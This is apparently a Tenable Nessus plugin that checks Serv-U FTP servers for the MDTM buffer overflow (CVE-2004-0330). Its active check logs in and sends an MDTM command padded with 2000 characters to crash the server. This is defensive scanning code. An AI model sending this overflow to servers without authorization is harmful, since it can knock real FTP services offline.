#
# (C) Tenable Network Security, Inc.
# 


include("compat.inc");

if(description)
{
 script_id(12080);
 script_cve_id("CVE-2004-0330");
 script_bugtraq_id(9751);
 script_osvdb_id(4073);
 script_xref(name:"Secunia", value:"10989");
 script_version ("$Revision: 1.23 $");
 
 script_name(english:"Serv-U MDTM Command Overflow");
 script_summary(english:"Serv-U Stack Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Serv-U FTP server.

There is a bug in the way this server handles arguments to the MDTM 
requests that could allow an attacker to trigger a buffer overflow 
in this server and disable it remotely or potentially execute 
arbitrary code on the host." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Feb/646" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Serv-U 5.0.0.4 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Serv-U FTPD MDTM Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/02/26");
 script_set_attribute(attribute:"patch_publication_date", value: "2004/02/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/02/25");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:serv-u:serv-u");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
		  
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/servu");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

include("audit.inc");
include("misc_func.inc");
include("global_settings.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port:port);
if ( ! banner ) exit(0, "Unable to grab FTP banner for server on port " + port + ".");

matches = eregmatch(
  pattern:"^.*Serv-U FTP( |-Server | Server )v[ ]*(([0-9a-z-]+\.)+[0-9a-z]+)(.*$|$)", 
  string:banner, 
  icase:TRUE
);
if(isnull(matches) || isnull(matches[2]))
  exit(0, "Remote FTP server on port " + port + " is not Serv-U FTP.");

version = matches[2];

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if (!login || safe_checks()) {
  if(egrep(pattern:"Serv-U FTP[- ]Server v([0-3]|4\.[0-2])($|[^0-9])", string:banner)) {
    if(report_verbosity > 0)
   { 
     report =
     '\n  Installed Version : ' + version + 
     '\n  Fixed Version     : 5.0.0.4' +
     '\n' + 
     '\nNote that Nessus has determined the vulnerability exists on the remote' +
     '\nhost simply by looking at the software\'s banner.  To really check for' + 
     '\nthe vulnerability, disable safe_checks and re-run the scan.\n';
     security_hole(port:port, extra:report);
   }
   else security_hole(port);
   exit(0);
 }
 else audit(AUDIT_LISTEN_NOT_VULN, "Serv-U FTP", port, version); 
}
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(login)
{
 soc = open_sock_tcp(port);
 if (!soc) exit(1, "Failed to open a socket on port "+port+".");
 
 to = get_read_timeout();

 if (! ftp_authenticate(socket:soc, user:login,pass:password))
   exit(1, "Could not log into the remote FTP server on port "+port+".");
 crp = crap(data:"a", length:2000);
 req = string("MDTM  ", crp, "\r\n");
 send(socket:soc, data:req);
 
 vuln = TRUE;
 
 for (i=0; i<5; i++)
 {
   r = recv_line(socket:soc, length:4096, timeout:to);
   if(r)
   {
     vuln = FALSE;
     break;
   }
   sleep(1);
 }
 ftp_close(socket: soc);

 if(vuln)
 {
  if(report_verbosity > 0)
  {
    report =
    '\nNessus confirmed the vulnerability since it failed to receive any' +
    '\ndata from the server after 5 attempts post exploitation.\n';
    security_hole(extra:report, port:port);
  }
  else security_hole(port);
  exit(0);
 }
 else audit(AUDIT_LISTEN_NOT_VULN, "Serv-U FTP", port, version); 
}
else exit(0, "No login credentials available to test vulnerability for " + 
             "FTP server on port " + port + "."); 
